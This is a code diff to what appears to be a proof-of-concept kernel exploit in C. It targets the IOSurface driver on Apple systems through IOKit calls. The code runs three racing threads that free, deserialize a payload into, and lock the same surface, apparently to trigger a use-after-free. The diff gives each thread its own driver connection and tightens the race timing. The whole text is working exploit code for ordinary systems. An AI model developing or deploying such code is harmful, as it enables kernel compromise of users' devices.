@@ -102,6 +102,8 @@ static IOSurfaceRef create_surface_ref(uint32_t *out_sid) {
 }
 
 static void *thread_freer(void *arg) {
+    io_connect_t conn = open_iosurface();
+    if (conn == MACH_PORT_NULL) return NULL;
     while (atomic_load(&g_running)) {
         uint32_t sid = 0;
         IOSurfaceRef surf = create_surface_ref(&sid);
@@ -109,36 +111,42 @@ static void *thread_freer(void *arg) {
 
         atomic_store(&g_active_surface_id, sid);
 
-        for (volatile int i = 0; i < 40; i++);
+        for (volatile int i = 0; i < 30; i++);
 
         CFRelease(surf);
         uint64_t scalar_in = sid;
-        IOConnectCallScalarMethod(g_connection, SELECTOR_RELEASE_SURFACE, &scalar_in, 1, NULL, NULL);
+        IOConnectCallScalarMethod(conn, SELECTOR_RELEASE_SURFACE, &scalar_in, 1, NULL, NULL);
 
         atomic_store(&g_active_surface_id, 0);
         atomic_fetch_add(&g_race_iterations, 1);
     }
+    IOServiceClose(conn);
     return NULL;
 }
 
 static void *thread_deserializer(void *arg) {
+    io_connect_t conn = open_iosurface();
+    if (conn == MACH_PORT_NULL) return NULL;
     uint64_t scalar_out[2];
     uint32_t scalar_out_cnt = 2;
     while (atomic_load(&g_running)) {
         uint32_t sid = atomic_load(&g_active_surface_id);
         if (sid == 0) continue;
         scalar_out_cnt = 2;
-        IOConnectCallMethod(g_connection,
+        IOConnectCallMethod(conn,
                             SELECTOR_DESERIALIZE_SURFACE,
                             NULL, 0,
                             kSerializedPayload, sizeof(kSerializedPayload),
                             scalar_out, &scalar_out_cnt,
                             NULL, NULL);
     }
+    IOServiceClose(conn);
     return NULL;
 }
 
 static void *thread_locker(void *arg) {
+    io_connect_t conn = open_iosurface();
+    if (conn == MACH_PORT_NULL) return NULL;
     uint64_t scalar_in = 0;
     uint64_t scalar_out = 0;
     uint32_t scalar_out_cnt = 1;
@@ -147,10 +155,11 @@ static void *thread_locker(void *arg) {
         if (sid == 0) continue;
         scalar_in = sid;
         scalar_out_cnt = 1;
-        IOConnectCallMethod(g_connection, SELECTOR_LOCK_SURFACE, &scalar_in, 1, NULL, 0, &scalar_out, &scalar_out_cnt, NULL, NULL);
+        IOConnectCallMethod(conn, SELECTOR_LOCK_SURFACE, &scalar_in, 1, NULL, 0, &scalar_out, &scalar_out_cnt, NULL, NULL);
         char unlock_struct[4] = {0};
-        IOConnectCallMethod(g_connection, SELECTOR_UNLOCK_SURFACE, NULL, 0, unlock_struct, sizeof(unlock_struct), NULL, NULL, NULL, NULL);
+        IOConnectCallMethod(conn, SELECTOR_UNLOCK_SURFACE, NULL, 0, unlock_struct, sizeof(unlock_struct), NULL, NULL, NULL, NULL);
     }
+    IOServiceClose(conn);
     return NULL;
 }
 
